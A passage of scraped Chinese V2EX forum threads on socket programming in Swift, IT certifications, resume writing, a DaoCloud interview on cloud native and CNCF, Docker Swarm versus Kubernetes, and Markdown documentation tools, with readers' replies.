几个字,就有补全出来了,但是除了类型提示信息,其他都是空. 点进头声明看看. Swift 翻译过来的声明是这样的.\n<code>public func socket(_: Int32, _: Int32, _: Int32) -&gt; Int32</code>\nSwift 把 C 函数声明的参数名给丢了,而且也没有在前面加上注释.\n按以往,对于不熟悉的函数一般是直接看下声明及其中的文档就基本可以用了. 不过对于导入到 Swift 的 C 头文件很多声明信息丢失了. 看来只有打开文档了.\n直接在 man 手册页就可以查到 <code>socket</code> 函数的文档. 其实其声明是:\n<code>int socket(int domain, int type, int protocol);</code>\n这个函数声明看起来是挺简单的,但是选择合适的参数,也是要费一些脑筋的.\n<code>domain</code> 似乎有点奇怪, 还有一系列 <code>AF_XX</code> 和 <code>PF_XX</code> 参数.\n我知道 TCP 和 UDP, 但是并没有直接指定 TCP 或 UDP 的参数.</p>\n<h3>在 <code>connect</code> 与 <code>struct sockaddr</code> 相遇: 痛苦的源泉.</h3>\n<p>初看之下 <code>connect</code> 函数好像挺简单的.\n<code>int connect(int socket, const struct sockaddr *address,socklen_t address_len);</code>\n但是马上就有了困惑,这个 <code>address_len</code> 是什么? 看起来像是说地址的长度,  为什么需要提供这个参数? 这个参数到底是什么呢? 文档也没有说. 先不管, 先搞定第二个参数 <code>struct sockaddr</code> 再说.\n此时我沉浸在对于简单的结构的想像中,如 <code>struct point</code> 直接 <code>struct point p = {3,4}</code> 就可以构造一个了.然而不幸的是, man 手册没有<code>struct sockaddr</code> 这个结构的说明.\n直接打开 Swift 中导入的 <code>struct sockaddr</code> 声明.</p>\n<pre><code>   /*\n * [XSI] Structure used by kernel to store most addresses.\n */\npublic struct sockaddr {\n    public var sa_len: __uint8_t /* total length */\n    public var sa_family: sa_family_t /* [XSI] address family */\n    public var sa_data: (Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8) /* [XSI] addr value (actually larger) */\n    public init()\n    public init(sa_len: __uint8_t, sa_family: sa_family_t, sa_data: (Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8, Int8))\n}\n</code></pre>\n<p>毫不夸张的说,看着有点傻眼.特别是这个 <code>sa_data</code> 到底要传什么? 还有为什么这里 <code>sa_len</code> 又要传什么长度? <code>sa_family</code> 是指协议簇吗? 可以我创建 <code>socket</code> 的时候已经声明过了啊?\n此时,我觉得光看文档, 看头文件声明,已经不能继续把代码写下去了.</p>\n<h3>地址系列</h3>\n<p>后来经过 Google,我发现 Socket 编程的这个地址处理的水很深.\n涉及到的结构有这么一些:\n- <code>struct sockaddr</code>\n- <code>struct sockaddr_in</code>\n- <code>struct sockaddr_in6</code>\n- <code>struct in_addr</code>\n- <code>struct addrinfo</code>\n- <code>struct sockaddr_storage</code></p>\n<p>每一个结构都是让人头晕的那种, 更何况我开始看的是 Swift 中翻译过来的声明. 我想静静.</p>\n<h3>如何解毒?</h3>\n<ol>\n<li>\n<p>后来我找到了 <a href=\"https://github.com/vapor/socks\" rel=\"nofollow\">vapor/socks</a> 这个 封装了 Socket 库的 Swift 库,代码和结构都非常 Nice,要使用 Swift 进行  TCP/UDP 编程的话,推荐使用这个库. 事实上,我刚开始贴的理想中的代码的样子,就是来自 socks 的一段测试代码.</p>\n</li>\n<li>\n<p>如果想要搞清楚上面的系列 Socket 的地址结构. 不用多想,\n直接找到 <strong>W. Richard Stevens</strong> 的 <em>UNIX 网络编程 卷 1:套接字联网 API</em> 一书. 翻到第三章: <strong>套接字简介 (Sockets Introduction)</strong>,然后就会找到答案了.</p>\n</li>\n</ol>\n<h3>点题</h3>\n<p>原来是想直接凭文档和声明接口就可以进行 Socket 编程的.\n实践下来这是根本不可行的. Socket 库 从 上个世纪 80 年代到现在已经有 30 多年的历史了. 随着时代的发展,其 API 自然会发生这样那样的变化, 如果没有老司机带路, 这路不好走.\n老实说, Socket 库从 80 年代到现在,API 基本没什么变化. 除了 <code>sockaddr</code> 这一块比较复杂之外, 其他的都比较简洁明了. 另外一个明显的复杂度主要来源于期望的偏差, Socket 编程不仅仅是用来进行 TCP/UDP 编程,它具有更强大,更通用的能力.</p>\n</div></div>"], "reply": "13", "tittle": "不了解历史不足以写代码: 学 Socket 编程有感.", "comment": ["不看名著不足以写代码，还是把两卷书都看一下比较好。", "不使用 CF 直接用 Bsd socket 恐怕写异步比较麻烦吧？", "写了这么多我还以为你通宵造了个轮子 = =!", "噗， po 主是哲学家", "最近在看 UNP ，确实水很深， socket 要支持所有网络编程里面的功能，光是套接字选项都占了一整章。所以要用 socket 接口写代码要保证对网络方面的细节足够的熟悉才行，最好还是用各种封装的库吧。", "以为你通宵造了个轮子 +1", "为何都开发 ios 了 c socket 编程还是初遇……不是大一的内容么", "  异步的话, 结合 GCD , 目前我是这样做的.", " \r", " \r", "\r", "vapor/socks 这个轮子我觉得比我造的好, 我就不造了.", "看来要买一本 《中华上下五千年了》", "网络编程不看 UNP ，不看 man ， socket API 表示我还能说什么，我也很无奈。", "楼主这是面向头文件 socket 编程，是在下输了。", "看《 c++网络编程》一书，你啥历史也没说明白"]},
{"content": ["<div class=\"topic_content\">我倒是觉得可能证书带来的经济收入或者能力提升没有太多\r<br>但是，转念一想，除了工作，给自己设定一个目标，并在考证过程中，参与培训，做一些工作之外的事情，并结识一些新的朋友，似乎也是不错的选择\r<br>\r<br>大家建议考一些工作相关的认证，还是跨行呢，比如程序员考 DBA 或网络相关的？\r<br>现在有哪一些稍微有含金量的认证呢</div>"], "reply": "27", "tittle": "大家觉得认证是否必要（ Oracle 认证、思科认证....）", "comment": ["同学有 CCIE ，从事相关工作，单从钱来看，每月加 1k 吧。", "跨行好了 都一心扑在本专业, 视野可能有局限吧，话说我是觉得一味的去考个证没多大作用，国内常见的证也被考烂了\r", "拿过红帽跟 oracle 的认证,面试的时候感觉也没有多大优势。\r", "含金量的证不清楚，坐等下面人回答", "进国企有用", "有用  艺多不压身 有时间就学了吧", "坐等", "应该是红帽吧", "国外公司认证感觉还是有点用的。", "考些有意思的证书肯定比每天回家看直播要好\r", "哪怕是烹饪证书也好哇\r", "怪不得我还是这么胖 눈_눈", "考个注会什么的", "我也想过这个问题: 雅思 or 托福, 锻炼英语以及思维,出国还有用..", "国企 外企应该有用 思科这个证不是很好考 而且考试费用也不低噢..", " 这个就有点高难度了吧", " 在国企，还没发现有啥用，可否举例说说", " 程序员节点问认证和注会有什么关系。。。注会对于程序员几乎没有什么帮助吧。", "求告知哪儿去考 EMC 认证，我去年 EMC 教材的数据存储与管理学的比较稳，再不考要忘光了", "跨行不建议，程序员去考个思科先不说有没有用，考完一直不用半年就可以忘记一大半", "数据库行业， ocp 含金量几乎为 0 ，可以试试 ocm （投标、应聘都可用到，部分单位可挂靠）\r", "当然，数据库行业工作更多体现的是临场能力（紧急救援、性能优化、备份等等）", "lpic 對要常做 server 部屬或者兼做運維的程序員應該有幫助", "学生不建议，工作接触多的建议去考一个， CCIE,OCM,PMP 这些对小公司还是有挺多帮助的，如果有 ITIL Expert 资质啥的对互联网公司也有很大帮助", " 你可以主动问一下，我老婆他们单位有思科和电工证多 800 一个月", "如果当程序员，这些证基本上没用，能力更重要", "有的呀，我转行就靠考证换的", "有时间的话， 不如自己写点有趣／有用的程序，放到 github 上", "老哥稳", "看行业，之前面试官说有的人挂证一个月单位发好几千，国企。", "学生么就算了，考证费培训费什么的本来就太贵，而且从某种程度来说这些证书确实也没啥大用，但是你说要不要当然有比没有好的。很多公司等你任职后每年都有一定的培训经费，到时候通过这个培训考证也可以。当然不管有证没证基本的技术还是要的，否则面试一问三不知再多证也没用的。", "你认为有没有用没有用  面试官 /企业觉得有用才有用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>根本没找工作的经验啊,上次找工作还是 3 年前的事,合同到期,打算换语言从头来,发现简历写的跟坨屎一样.项目经验就是在职这三年做的项目,每个都写成了,根据项目需求,完成 XXX 功能,负责 XXX,......还有一个月就离职了,,,,我要窒息了</p>\n</div></div>", "<div class=\"topic_content\">谢谢各位的解答,我已经知道自己的原因出现在哪了 谢谢各位的回复</div>"], "reply": "25", "tittle": "简历写的像坨屎怎么破", "comment": ["不懂，既然项目经历都写好了还有啥愁的", "我一般也是这么写的，虽然觉得也没啥亮点，不过也是能找到工作的", "3 年应该有不少项目经验了。\r", "每个项目几个方面：\r", "1 ，项目是干嘛的，一句话介绍背景。\r", "2 ，项目使用的技术。列举使用到的技术栈，让阅读简历的人知道你在项目中使用过哪些语言、框架、工具、算法等。\r", "3 ，我在团队中担负什么样的角色。介绍你在团队中的角色定位和职责。“做过某项目”和“在项目中担负开发 /主程 /架构师 /项目经理”两种描述方式差距好大。\r", "4 ，对自己成长很大的项目提一下自己的收获。技术、非技术方面。有过重大职责、大幅度成长的项目是面试时介绍的重点。", " 因为要换语言。", " 同上。。要换语言", " 谢谢", "所以你告诉我你三年没换过语言。同时，这个你想换的语言自己没有做过点小东西玩？然后你想去一个公司愿意带你熟悉这个语言？……", "换语言为啥要提出来说？\r", "\r", "换 c++还是 erlang?\r", "\r", "常见类 C 语言的话换不换没啥区大别。\r", "\r", "项目经验和语言没关系。\r", "\r", "和用到的技术，踩过的坑，得到的经验有关系。", "看了下楼主的回复记录。\r", "\r", "c#转 Python 。\r", "\r", "语言上肯定没什么问题。\r", "\r", "但是 win 和*nix 的生态完全不一样，这个问题比较大。", "简历一般注意这些问题会得到加分：\r", "1.工作经历用倒叙的方式写，第一条写现在的工作，第二条写上一个，以此类推，距离现在时间越久的，越往后放。可以参考这样的格式：\r", "    2014.04.04~2017.02.02   xxxxx 公司       技术主管\r", "       工作职责（ 1.balabalah~\r", "                         2.balabalah~）\r", "       项目经验（ 1.balabalah~\r", "                         2.balabalah~）\r", "     2012.05.16~2014.03.12   xxxx 公司        技术主管\r", "      （同上）\r", "2.当写完工作经历之后，再写自己的特长，擅长的语言啦什么的\r", "3.放自己的案例，比如说你写过什么小东西啊，做过什么小玩意啊，都附上\r", "这样的话整个简历就很干净整洁，有条有理，如果三年经历，足够写得很漂亮啦。", "头一次听说换工作是因为要换语言的..", "真有能耐的话别说像坨屎,就是坨屎也一堆公司抢,别怕,踏实地把项目经验和技术 tag 写清楚就够了.\r", "如果你想进一步,某乎上有一个关于简历的文章,包括简历布局,热点,配色等等技巧,可以去看看.", "简历中的自我评价和自我介绍很重要！！！", "三年工作经验?简历都搞不定？那样还是别离职了吧!把你懒的...", "  这个真的是因为想换语言......", " 没办法,,就是三年一份工作,,,真的没啥经验", " 谢谢大佬教育...晚上回去好好改一下简历", " 谢谢....", " 谢谢...受教了", " 做过一些东西....只是现在有点 SB 的没往简历上面写", "我记得当时找工作时， 同学都简历都是一大本的，甚至还有自己全身照片那种。\r", "\r", "我的简历就一张 A4 纸张， 分几个区块， \r", "\r", "1.基本信息，方便别人联系我\r", "2.教育经历 \r", "3. 技能，求职意向\r", "4. 工作经验，倒叙\r", "\r", "\r", "差不多就这样了。 \r", "\r", "\r", "后来自己开公司后， 我也很烦那种很多简历的， 能简单描述自己技能者，我觉得工作上也会是一个有效率的人。\r", "\r", "\r", "再套个好看的模版，足以。", " 了解了,谢谢.O(∩_∩)O~~", "试试逆向思维。\r", "\r", "不要想你做了些什么，多想想下一个公司对你的期望是什么，他们为什么愿意拿那么多钱来换取你的入职？\r", "不要罗列项目，写写你在上一份工作中的价值是什么？解决了什么问题？\r", "- 带领 N 人团队从无到有地完成了 XXX （体现学习能力、实际解决能力、项目管理能力）\r", "- 独立完成了访问量从数万到数百万的增长，仅需要 XX 台机器，性能保持在 XXX （体现学习能力和实际解决能力）\r", "- 两周时间完成自学语言 B 并且项目完整上线（体现学习能力和实际解决能力）\r", "……\r", "\r", "我在 V2EX 看到很多简历都附上了个人感悟，个人成长，但感觉这些没啥意义——没人关心你的感受，都只关心你可以带来什么价值，解决什么问题。\r", "\r", "最后逼自己一下：如果只能保留三项，是哪三项？如果只能写一项，哪一项放最上面？\r", "技能树就像是 @", " 提到的，简单放在个人信息就好了，但还是应注意精简，可有可无的不要拿出来分散浏览者的注意力。\r", "\r", "一点建议，希望有所帮助。", " 感谢，涨见识了。", " “和用到的技术，踩过的坑，得到的经验有关系。” 我觉得简历中 如果能写到这些还是不错"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>道客船长新推出访谈类栏目 「坐而论道」，由两位重量级嘉宾 Docker Swarm 全球 Maintainer 孙宏亮 (Allen) 和 DaoCloud 首席架构师王天青 (Grissom) ，共同探讨云计算行业的热门话题，从技术和业务的角度探索容器技术的最佳实践.</p>\n</blockquote>\n<blockquote>\n<p><img alt=\"\" src=\"http://mmbiz.qpic.cn/mmbiz_png/1DjrTiaica04nOtiaYoDRXjjT5ZI0VW86YrlYdu11kEZz1ibz9NGdgRnCJ9zOWIYWibv1a5mzOASADsC6rQTa2ICricw/0?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n</blockquote>\n<p>2015 年 7 月， Docker 、 Intel 、 Red Hat 、 IBM 等 19 家知名公司共同创建了 “云原生计算基金会（ CNCF ）”，目标在于解决一个长久以来困扰业界的难题——云体系应该采用怎样的架构来服务现代应用。近期，<strong>DaoCloud 也很荣幸成为 CNCF 的一员，共同推动云原生行业落地。</strong>本期「坐而论道」， Allen 和 Grissom 将围绕 “云原生” 与 “ CNCF ” ，分别从技术和业务角度，探讨云原生的价值。</p>\n<h2>Q 1 CNCF 成立的初衷主要围绕 “云原生” 服务，而 “云原生” 这一概念其实是在 2015 年才提出，之后在业界得到了大力推广并迅速成为云计算技术和应用的新趋势。在讨论它的影响前，我们先来聊聊“云原生”为何而生？</h2>\n<p><strong>Allen</strong></p>\n<blockquote>\n<p>我觉得任何事物的诞生肯定是有其自身的原因，这个原因就是当前所遇到的挑战。从我目前的认知来说，可以从以下几个角度来讨论<strong>目前行业遇到的挑战</strong>：</p>\n</blockquote>\n<blockquote>\n<p>第一个挑战：在目前的行业中，<strong>软件交付方面存在一些障碍</strong>。这时候为了适应新的格局行业亟需变迁，在变迁的过程中会出现各方推力。一方面的推力是互联网模式的诞生，应用的喷薄式增长，带来巨大的交付压力，这是软件流程方面面临的一大挑战。</p>\n</blockquote>\n<blockquote>\n<p>第二个挑战涉及应用架构，<strong>在应用架构方面，项目管理、应用管理方面存在一些弊端</strong>。其实大家已经发现了单体应用架构存在的问题，这个时候就有一些推力让它朝着新的软件模式的方向发展。</p>\n</blockquote>\n<blockquote>\n<p>还有最后一个挑战：在上层应用架构转变的过程中，底层——<strong>数据中心的架构，数据中心的能力，是否可以很好地支撑上层的应用架构，或是软件流程的变化</strong>。数据中心也要谋变，不谋变的话，往往压力会很大。</p>\n</blockquote>\n<blockquote>\n<p>以上是我认为当前行业软件行业面临的 3 个方面的挑战。</p>\n</blockquote>\n<p><strong>Grissom</strong></p>\n<blockquote>\n<p>T 最终是必须要服务业务的，所以我主要会从业务角度探讨这个问题。从<strong>业务的角度</strong>来看，企业老板，尤其是互联网行业的老板，只关注两类最核心的问题：这个功能明天能不能上线？双 11 能撑得住吗？类似于这样的问题。他希望的是什么呢？其实就是又快又好。</p>\n</blockquote>\n<blockquote>\n<p>（ Allen ：甚至不花钱）</p>\n</blockquote>\n<blockquote>\n<p>其实<strong>速度和质量</strong>更重要一些，当然你说的不花钱，或者成本比较小，也是一个关注点。那些独角兽公司，例如当时的 Pivotal ，有一本书名字叫作 <strong>Migrating to Cloud-Native Applications Architectures</strong>，书中总结了<strong>四条成功的秘诀</strong>。</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>第一条就是 <strong>speed of innovation</strong>，就是快，“天下武功唯快不破”。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>第二条秘诀叫作 <strong>always available service</strong>，就是服务 24 小时都可用，可用性很重要。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>第三条秘诀 <strong>web scale</strong>，就是从 0 到 1 要能快速复制。具体来说，比如说你们公司从天使轮开始只有 500 个用户， A 轮后已经增长到了 10 万，甚至可能是 100 万用户。那么，整个体系就要有能力支撑这么大体量的用户，这一点非常重要。</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>最后一点同移动互联很有关系，<strong>mobile first</strong> 移动优先。我们先不探讨具体怎么做，但是这是行业对 IT 的要求。</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>对创业公司来讲， IT 部门最关键的就是必须要做到这四点。从<strong>业务层面来看，云原生的产生对 IT 提出了新的需求</strong>。由于传统行业对安全保障性要求更高，比如说银行业、金融行业，他们每个 release 的周期可能是半年，甚至是一年，这样的情况在互联网行业往往不现实。<strong>所以，云原生针对互联网行业能够提供更大的帮助和价值。因为对他们来说，云原生能够切切实实解决业务层面的问题</strong>。</p>\n</blockquote>\n<blockquote>\n<p><img alt=\"\" src=\"http://mmbiz.qpic.cn/mmbiz_jpg/1DjrTiaica04nOtiaYoDRXjjT5ZI0VW86Yr8KN3fp5C993z6WwC1gw5pibjQMruawsWgU8ltIbgpGpXpEoAicLcH2qw/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n</blockquote>\n<p><strong>Allen</strong></p>\n<blockquote>\n<p>这个方面我还想多说一点，不仅仅是创业公司，包括微软这类大型企业，公司层面的策略也是基于 cloud first ， mobile first 。从业务角度来讲，这不仅仅是对技术的要求，也是对整个企业策略方面的要求。</p>\n</blockquote>\n<h2>Q 2 云原生技术的出现，会对现代化应用带来哪些实质影响？</h2>\n<p><strong>Grissom</strong></p>\n<blockquote>\n<p>这个问题可以从几个方面来理解。云原生能够解决老板的问题就是又快又好了。<strong>快，就是整个研发的流程、迭代周期快</strong>。通过<strong>微服务架构</strong>，可以把原来一个大的单体应用拆成了一块块小的部分，这样就实现了高耦合。改动比较小的部分通过小步迭代的方式，粒度很小，很多功能其实只要改一二行代码，就可以快速上线。</p>\n</blockquote>\n<blockquote>\n<p>过去一个大的单体应用，所有人都在上线，很难在比较短的周期内完成全部工作。很多时候，一处小的修改，需要把整个测试重新做一遍，甚至两周都无法完成既定目标。但是，在使用微服务架构之后，这个问题迎刃而解。</p>\n</blockquote>\n<blockquote>\n<p>然后，通过持续集成的流程可以很好地保证代码从提交，到最后的交付，这一整个流程的自动化。同时中间过程中可以通过各种自动化测试来保证质量。</p>\n</blockquote>\n<blockquote>\n<p>最后，就是底层的<strong>敏捷基础架构 docker</strong>。它使得交付能够做到标准化，保证在开发测试生产上，环境都是基本一致的。这样一来，交付时间大幅度缩减，因为标准化势必会提高整体的效率。最后，通过做到更小的粒度使得整体的交付效率大幅度提升。<strong>这是从“快“的角度延伸来讲，“云原生技术”能解决的问题</strong>。</p>\n</blockquote>\n<blockquote>\n<p><strong>从质量的角度来讲</strong>，从前，我们更多采用的是人工介入的方法，而现在更多是通过<strong>自动化的方式</strong>，包括运维，我们都会使用基于容器的自动化运维方式。它能够很好地支撑整个体系，避免人为造成的问题。同时，通过结合一些<strong>最佳实践</strong>，如应用架构层面的实践，避免了过去踩过的坑。这样的话，我们不仅在整体上<strong>提升了效率，同时能够有效避免犯一些错误</strong>。</p>\n</blockquote>\n<blockquote>\n<p>另外还有一个方面，微服务架构这一块，在可用性、可扩展性、可靠性方面，比原来的单体应用都会有所提升。由于原来是单体架构，现在通过集群让每个地方都可以做到扩展。老板想要的又快又好，针对这种突发的场景，整个云原生的理念或者整个体系的配套，是可以充分满足这些需求的。</p>\n</blockquote>\n<blockquote>\n<p><img alt=\"\" src=\"http://mmbiz.qpic.cn/mmbiz_jpg/1DjrTiaica04nOtiaYoDRXjjT5ZI0VW86YrwIl1ibOKRqPLm45IeNvcppWeEtehFZURsQQ1K0j7HHkmbxxCmXhp6zg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\"></p>\n</blockquote>\n<h2>Q 3 云原生应用技术具有诸多的优势，如何帮助其更好地服务现代化应用，也成为行业共同探讨的问题。 CNCF 的成立，是行业解决问题的一个新思路。 DaoCloud 加入了 CNCF ，未来在技术方面会带来哪些变革或贡献？</h2>\n<p><strong>Grissom</strong></p>\n<blockquote>\n<p>DaoCloud 在初期的时候，给人的印象是个容器公司。刚才提到的 <strong>云原生和微服务， DevOps ，还有以容器为代表的敏捷的技术架构，我们可以称之为是 DaoCloud 的黄金三角。</strong>但是就像一个三角架， 3 个角，现在缺了一角。为了更好地提供支持，我们想通过学习 Pivotal ，或者同 CNCF 这样的组织有更紧密的合作，最终能够更好地支持微服务这个大生态，这样我们的产品才能更好地去服务好这些业务。</p>\n</blockquote>\n<blockquote>\n<p>另外，业务其实是应用，它跟底层的架构，还有一定距离，底层架构很重要。但实际上，一定要在流程上从上到下提供更好的服务。在这之前，我们已经帮客户解决了容器的问题，现在我们要帮助客户解决应用的问题。当然容器的问题我们还会一直做下去，但是会上升到更高的一个层面来帮助客户解决应用的问题。这个应用就是新时代下的<strong>云原生应用</strong>。</p>\n</blockquote>\n<blockquote>\n<p>从我个人的理解来看，并非意味着容器变得不重要了，而是现在的核心目标是做好服务。所以，我们的三大产品线， DaoCloud Services 、 DaoCloud Enterprise 、 DaoCloud Voice ，就是围绕应用在做这些事情。</p>\n</blockquote>\n<p><strong>Allen</strong></p>\n<blockquote>\n<p>我觉得从开源技术的角度来讲，<strong>基金会 CNCF 的诞生可以从 3 个方向应对行业面临的挑战</strong>：一个方向是 <strong>container packaged</strong>，也就是通俗意义上的软件<strong>打包方式，交付方式</strong>，然后沿着这条路走下去，又可以做到在 <strong>DevOps</strong> 方面的改进。第二个方面是 <strong>microservices</strong>，面向<strong>微服务</strong>，主要聚焦在应用架构方面。第三点就是 <strong>dynamical management</strong>，<strong>动态管理</strong>方面，是数据中心的领域。</p>\n</blockquote>\n<blockquote>\n<p>这 3 个方向中，关于 container packaged ，目前行业里面需要制定一个容器标准。行业里面目前都会比较认同 OCI ，那么 OCI 的标准是谁在推动呢？业界比较有名的一些 IT 公司，包括 IBM 、 Red Hat 、 Docker 等公司，它们为了整个行业的标准在推动。从技术角度来讲，随着 OCI 标准的建立，<strong>我们希望看到的是依附这个标准出现更多的具体实现</strong>。</p>\n</blockquote>\n<blockquote>\n<p>在行业当中，目前使用标准这方面的是 docker ，我们希望通过社区的能力、技术手段把 docker 这个方面做得更好，更成熟，帮助 docker 在企业落地的时候排除一些障碍。这也是 DaoCloud 在社区中做过的一些贡献和投入，我们会<strong>从企业的角度去收集一些需求和想法，然后在开源社区里做贡献</strong>。</p>\n</blockquote>\n<blockquote>\n<p>在<strong>微服务</strong>领域，我们希望<strong>通过技术理念影响整个社会</strong>，带来一些不一样的东西。我们主要关注如何和传统充分融合，如何去改变一些已有的模式，为企业真正地提供价值。在这个方面，像 Grissom 、 Chris Richardson 等微服务行业的大亨，他们可以为企业提供一些专业的服务，比如说咨询。</p>\n</blockquote>\n<blockquote>\n<p>关于第三个方面是<strong>敏捷的 IT 架构</strong>，或者说是<strong>编排能力</strong>。例如 docker 的 swarmkit ， kubernetes ，这是一种多样性，说明这个生态是活跃的。我们甚至可以反推，企业级对于这方面的需求，明显是最旺盛的，这也是长期来看的一个发展方向。<strong>我们目前选择的 swarmkit ，是一条“原生”的技术方向，为企业解决一些实际问题</strong>。我们也会在技术、编排和 cloud native 开放性方面做起，兼容并包。<strong>推进整个行业的标准，进而真正为企业解决问题，实现共赢</strong>。</p>\n</blockquote>\n<h2>Q 4 作为 CNCF 的一员， DaoCloud 未来将会扮演什么角色？</h2>\n<p><strong>Allen</strong></p>\n<blockquote>\n<p>CNCF 的角色就是制定整个行业的标准，引导整个 IT 行业的应用架构朝着云原生方向发展。这是一个很大的目标，同时有很多细节需要去做。</p>\n</blockquote>\n<blockquote>\n<p>在政治方面，我们需要有类似委员会的机构，通过民主的形式，让大家共同来做决策。 DaoCloud 是委员会的一员，我们将共同参与和影响 CNCF 的发展。</p>\n</blockquote>\n<blockquote>\n<p>另外， DaoCloud 在 CNCF 中会用自己的实际行动，体现我们的最大价值，或者说发挥我们的重大贡献。作为基金会的成员，我们会在 CNCF 中做出更多的贡献，比如说在开源社区中，我们希望以一些项目为契机，投入更多的人力物力在开源社区的建设中。</p>\n</blockquote>\n<blockquote>\n<p>上游投入、基金会的管理是最重要的。同时在这个基础之上，我们要做的最重要的一件事就是：让更多的人，更多的企业参与到社区中来，共同建设生态，营造云原生的未来。</p>\n</blockquote>\n<pre><code>                       本期的「坐而论道」就到这里，下期内容敬请期待！\n</code></pre>\n<p><strong>嘉宾介绍</strong></p>\n<p><strong>Allen 孙宏亮</strong>： DaoCloud 技术合伙人， Docker Swarm 全球核心 Maintainer ， Docker 项目全球 Top 30 贡献者，《 Docker 源码分析》作者，《 Docker 容器与容器云》合作者。数年来一直深耕云计算领域，研究 PaaS 与容器技术等。是国内第一批 Docker 实践者以及布道者。爱开源，衷分享。</p>\n<p><strong>Grissom 王天青</strong>： DaoCloud 首席架构师，曾先后在麻袋理财担任职首席架构师， EMC 中国研究院任职主任工程师，工作十多年间，做过前端，做过后端， 对云计算有深入了解。目前对云原生应用之微服务架构及敏捷的基础架构（ Docker ）有比较多的研究和实践，同时对大型网站的技术架构有比较多的认识和实践，在 DaoCloud 负责企业客户应用微服务架构转型。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "坐而论道 | “云原生”时代：挑战 寻变 共赢", "comment": []},
{"content": ["<div class=\"topic_content\">百度分享那个不支持 https 太坑了\r<br>有没有现成的轮子，给个传送门，谢谢各位！</div>"], "reply": "6", "tittle": "求一个支持 https 的分享代码，谢了", "comment": ["我猜是资源文件导致 https 有叹号吧。如果是这样，自己缓存提取出来再替换并不难，没必要求轮子。", "WP 某主题的解决方法，你可以参考下，打包了分享的文件\r", "分享什么?  APP 的话用友盟就行了.", " 没错，我试过自己提资源，能力问题没搞定\r", " @", " 谢谢！非常感谢！", "Mob 平台可以，很方便"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>很明显在 Github 的 Star ， Contributor 的数量级上是不能比的。</p>\n<p>不过我还是想知道各位 V 友更推荐哪一个？ Reason ？</p>\n<p>看的一些比较老的文章说的是 Swarm 不负责负载均衡的问题，最新版本也是如此吗？我先去官网看看，感兴趣的可以讨论一下。： P</p>\n<p>By the way，每次发帖默认发到Chamber是什么情况。</p>\n</div></div>"], "reply": "9", "tittle": "Docker 集群，你们用 Swarm 还是 Kubernetes？", "comment": ["k8s, 1.2, 1.3 的时候学习了下，很不错，但入门稍显复杂，几个概念需要深入理解。\r", "docker swarm 只是测试过，特点是搭建集群特别简单， docker , docker-compose 这些使用习惯都能有保留。\r", "\r", "个人认为， docker swarm 已经集成到 docker 内部，无论从哪个方面来说，都应该熟悉。 k8s 面对大的场景有更多案例，也有不少人已经基于 k8s 创业，可以了解。\r", "\r", "去年在一个团队兼职，推广 docker ，但是团队只用到 docker-compose 层面就已满足需求，集群、复杂编排都不需要。这点挺触动我的，技术人员的思维，通常希望推荐最好的方式，但实际情况却是：用户的接受程度比我们想象的要慢。\r", "\r", "总之，这两没冲突，一个必须熟悉，一个很优秀，可以多了解。", " \"用户的接受程度比我们想象的要慢。\" 很有道理，目前我们公司不需要很大的场景，那我还是先熟悉 swarm 。 thx!", "生产环境 k8s, 内部测试环境 swarm.\r", "计划后面统一至 k8s .", "目前是 mesos+marathon", "  :-) 学习交流\r", "btw, 如果你们公司内部刚接触 docker ，建议先用 docker-compose,慢慢改变大家习惯，自然新的需求就来了。 docker-compose + overlay network + 存储 , 满足很多场景时很“清晰”，容易被接受。", "Rancher : )", " ok thx :)", "之前看文章说 swarm mode 的 overlay network 会有一定的性能损耗，不知道现在新版本改进没有", " 是啊， swarm 的年龄最小了。所以不如其他健全"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>客户要求要有文档，但没有限制格式</p>\n<p>既然如此 Word 坚决不考虑，同时因为项目本身保密性的问题，在线文档例如看云、作业部落等也不考虑</p>\n<p>求个本地的、支持 md 、多级目录的免费文档编辑器（毕竟你也不能指望让客户掏腰包去买个 key 来看你的文档啊）</p>\n<p>我设想的文件结构是这样的：</p>\n<p><img alt=\"\" src=\"https://ws1.sinaimg.cn/large/647b8589gy1fcxwsxf8g4j20cc02hjrf\"></p>\n<p>或者这样的：</p>\n<p><img alt=\"\" src=\"https://ws1.sinaimg.cn/large/647b8589gy1fcxwufy8lzj205302s3yg\"></p>\n<p>客户点开<strong>文档.exe</strong>，左侧菜单栏就会列出目录下的所有文件夹和 md 文件，点击可查看渲染后的 md</p>\n<p>请问有这样的软件吗，最好是绿色的？求推荐，谢谢各位！</p>\n<p>最终呈现效果希望是这样的：</p>\n<p><img alt=\"\" src=\"https://ws1.sinaimg.cn/large/647b8589gy1fcxwxz6khsj20if0aht8x\"></p>\n</div></div>"], "reply": "29", "tittle": "求个 Windows 平台的、支持 md、多级目录的免费文档编辑器", "comment": ["用 Markdown 写，然后打包成 .chm", " #1 这主意不错，但是如何打包呢？我搜了一下没找到", "gitbook", "在线文档可以使用令牌阅读功能然后发给你的客户啊 你这种本地看文档 和 邮件方式发送有啥区别？", " #3 线上的不行", " #4 主要是为了保密，不得让任何第三方得知文档内容", ".md -> .html -> .chm\r", "\r", "html 转 chm 的工具很多", " 这是一个笑话 就算是私密邮件你觉得是保密的不成", "vs code 如何？", " #8 你才是一个笑话，为什么保密的东西非要用邮件发？", "文档最终请转 pdf ，阅读器发 reader 给客户。", "楼主问的是编辑器啊……为何大家回答的是怎么转文档……", " 感觉你不太友好哎。 @", " 不过楼主要编辑器，是不是客户有编辑修改文档的需求。", "python 在 Windows 上的文档就是 chm ，用 Sphinx 转换，然后用 chm 编译器生成的。", "madoko ？", " 好吧 是我误会了 